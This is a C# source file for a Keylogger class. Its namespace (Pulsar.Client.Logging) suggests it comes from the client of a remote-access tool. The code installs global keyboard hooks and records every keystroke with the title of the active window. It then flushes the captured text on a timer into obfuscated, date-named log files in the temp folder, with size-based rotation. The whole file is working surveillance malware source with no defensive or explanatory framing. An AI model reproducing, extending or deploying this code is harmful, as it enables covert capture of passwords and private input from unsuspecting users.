using Gma.System.MouseKeyHook;
using Pulsar.Client.Extensions;
using Pulsar.Client.Helper;
using Pulsar.Common.Helpers;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using Timer = System.Timers.Timer;

namespace Pulsar.Client.Logging
{
    public class Keylogger : IDisposable
    {
        private readonly long _maxLogFileSize;
        private readonly Timer _flushTimer;
        private readonly object _syncLock = new object();
        private readonly StringBuilder _currentBuffer = new StringBuilder();
        private readonly IKeyboardMouseEvents _events;

        private string _currentWindow = string.Empty;
        private DateTime _lastWindowChange = DateTime.UtcNow;
        private string _logFilePath;
        private bool _isFirstWrite = true;
        private readonly TimeSpan _windowChangeThreshold = TimeSpan.FromSeconds(1);
        public bool IsDisposed { get; private set; }

        public Keylogger(double flushInterval, long maxLogFileSize)
        {
            _maxLogFileSize = maxLogFileSize;
            _events = Hook.GlobalEvents();
            _logFilePath = GetLogFilePath();

            _flushTimer = new Timer(flushInterval);
            _flushTimer.Elapsed += TimerElapsed;
            _flushTimer.AutoReset = true;
        }

        public void Start()
        {
            Subscribe();
            _flushTimer.Start();
        }

        private void Subscribe()
        {
            _events.KeyDown += OnKeyDown;
            _events.KeyPress += OnKeyPress;
        }

        private void Unsubscribe()
        {
            _events.KeyDown -= OnKeyDown;
            _events.KeyPress -= OnKeyPress;
        }

        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            string newWindow = NativeMethodsHelper.GetForegroundWindowTitle() ?? "Unknown Window";

            lock (_syncLock)
            {
                bool windowChanged = newWindow != _currentWindow;
                bool enoughTimePassed = DateTime.UtcNow - _lastWindowChange > _windowChangeThreshold;

                // Check if window changed significantly
                if (windowChanged && enoughTimePassed)
                {
                    _currentWindow = newWindow;
                    _lastWindowChange = DateTime.UtcNow;

                    // Start a fresh line for the new window
                    if (_currentBuffer.Length > 0 && !_currentBuffer.ToString().EndsWith(Environment.NewLine))
                        _currentBuffer.AppendLine();

                    // Append window header cleanly
                    _currentBuffer.AppendLine($"[{DateTime.UtcNow:HH:mm:ss}] {newWindow}");
                }

                HandleSpecialKey(e);
            }
        }

        private void HandleSpecialKey(KeyEventArgs e)
        {
            switch (e.KeyCode)
            {
                case Keys.Enter:
                    _currentBuffer.AppendLine();
                    break;
                case Keys.Back:
                    HandleBackspace();
                    break;
                case Keys.Space:
                    _currentBuffer.Append(' ');
                    break;
                case Keys.Tab:
                    _currentBuffer.Append("\t");
                    break;
                case Keys.Escape:
                    _currentBuffer.Append("[Esc]");
                    break;
                case Keys.Delete:
                    _currentBuffer.Append("[Del]");
                    break;
                case Keys.Up:
                case Keys.Down:
                case Keys.Left:
                case Keys.Right:
                    // Ignore arrow keys to reduce noise
                    break;
                case Keys.LControlKey:
                case Keys.RControlKey:
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                case Keys.LMenu:
                case Keys.RMenu:
                case Keys.LWin:
                case Keys.RWin:
                    // Ignore modifier keys alone
                    break;
                default:
                    // Log function keys
                    if (e.KeyCode >= Keys.F1 && e.KeyCode <= Keys.F24)
                    {
                        _currentBuffer.Append($"[{e.KeyCode}]");
                    }
                    break;
            }
        }

        private void HandleBackspace()
        {
            if (_currentBuffer.Length > 0)
            {
                // Remove last character if it's not part of a window header
                char lastChar = _currentBuffer[_currentBuffer.Length - 1];
                if (lastChar != '\n' && lastChar != '\r' && lastChar != ']')
                {
                    _currentBuffer.Length--;
                }
            }
        }

        private void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            lock (_syncLock)
            {
                if (!char.IsControl(e.KeyChar))
                    _currentBuffer.Append(e.KeyChar);
                else if (e.KeyChar == '\r') // Enter key
                    _currentBuffer.AppendLine();
            }
        }

        private void TimerElapsed(object sender, ElapsedEventArgs e)
        {
            try
            {
                FlushToFile();
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Keylogger flush error: {ex.Message}");
            }
        }

        private void FlushToFile()
        {
            lock (_syncLock)
            {
                if (_currentBuffer.Length == 0) return;

                string contentToWrite = _currentBuffer.ToString();
                _currentBuffer.Clear();

                WriteToFile(contentToWrite);
            }
        }

        private void WriteToFile(string content)
        {
            try
            {
                bool fileExists = File.Exists(_logFilePath);
                string finalContent;

                if (!fileExists || _isFirstWrite)
                {
                    finalContent = content.TrimEnd() + Environment.NewLine;
                    _isFirstWrite = false;
                }
                else
                {
                    string existingContent = FileHelper.ReadObfuscatedLogFile(_logFilePath);
                    existingContent = existingContent.TrimEnd(); // remove trailing whitespace/newlines

                    // Append new content with a newline separator
                    finalContent = existingContent + Environment.NewLine + content.TrimEnd() + Environment.NewLine;
                }

                // Check file size and rotate if needed
                if (Encoding.UTF8.GetByteCount(finalContent) > _maxLogFileSize)
                {
                    RotateLogFile();
                    FileHelper.WriteObfuscatedLogFile(_logFilePath, content.TrimEnd() + Environment.NewLine);
                    return;
                }

                FileHelper.WriteObfuscatedLogFile(_logFilePath, finalContent);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Log file write error: {ex.Message}");
            }
        }

        private void RotateLogFile()
        {
            try
            {
                string baseName = DateTime.UtcNow.ToString("yyyy-MM-dd");
                string basePath = Path.Combine(Path.GetTempPath(), baseName);
                string newFilePath = basePath + ".txt";

                int counter = 1;
                while (File.Exists(newFilePath))
                {
                    newFilePath = $"{basePath}_{counter:00}.txt";
                    counter++;
                }

                _logFilePath = newFilePath;
                _isFirstWrite = true;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Log rotation error: {ex.Message}");
            }
        }

        private string GetLogFilePath()
        {
            return Path.Combine(Path.GetTempPath(), DateTime.UtcNow.ToString("yyyy-MM-dd") + ".txt");
        }

        public void FlushImmediately()
        {
            FlushToFile();
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (IsDisposed) return;

            if (disposing)
            {
                try
                {
                    FlushToFile();
                    Unsubscribe();
                    _flushTimer.Stop();
                    _flushTimer.Dispose();
                    _events.Dispose();
                    _currentBuffer.Clear();
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Dispose error: {ex.Message}");
                }
            }

            IsDisposed = true;
        }
    }
}